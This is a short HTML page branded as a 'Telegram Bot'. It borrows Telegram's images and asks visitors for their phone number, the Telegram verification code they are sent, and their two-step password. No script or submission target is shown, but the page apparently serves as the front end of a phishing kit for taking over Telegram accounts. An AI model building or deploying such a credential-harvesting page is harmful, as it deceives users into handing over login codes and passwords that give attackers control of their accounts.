<!DOCTYPE html>
<!--
https://my.telegram.org/img/favicon-32x32.png
-->
<html lang="en-US">
<head>
    <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">  
<title>Telegram Bot</title>
</head>
<style>
*{
margin: 0;
padding: 0;
}

body{
background: #fff;
color: #000;
font-size: 20px;
}
label{
font-size: 14px;
}

input{
border: 1px solid #000;
 padding: 8px; width: 100%;
outline: none;
color: #000;
background: #fff;
border-radius: 2px;
}
.container_server_telegra{
display: flex;
justify-cotent: space-between;
tex-align: center;
width: 870px;
padding: 10px;
margin: 0 auto 10px;
}


input:focus{
border: 1px solid #3193e4;
}
.inputs{
width: 270px;
padding: 10px;
}
.image{
text-align: center;
}

.fong{
font-size: 30px;
}
@media(max-width: 999px){
.container_server_telegra{
display: block;
width: 100%;
}
.inputs{
width: 70%;
margin: 0 auto 10px;
}
.fong{
font-size: 17px;
}
}


</style>
<body>
<div class="container_server_telegra">
<div class="image">
<img src="https://my.telegram.org/img/tl_card_decentralized.gif" width="140" height="140"/>
<h2 class="fong">Welcome to Telegram Bot</h2>
</div>
<div class="inputs">
<label for="number"> Your number</label><br>
<input type="text" id="number"/>
<br>
<label for="code_telegram">Telegram code</label><br>
<input type="text" id="code_telegram"><br>
<p style="font-size: 13px;">Telegram sends a verification code, use that code here.</p>
<br>
<label for="code">two step code (if you have)</label><br>
<input type="text" id="code">
</div>
</div>
</body>
</html>
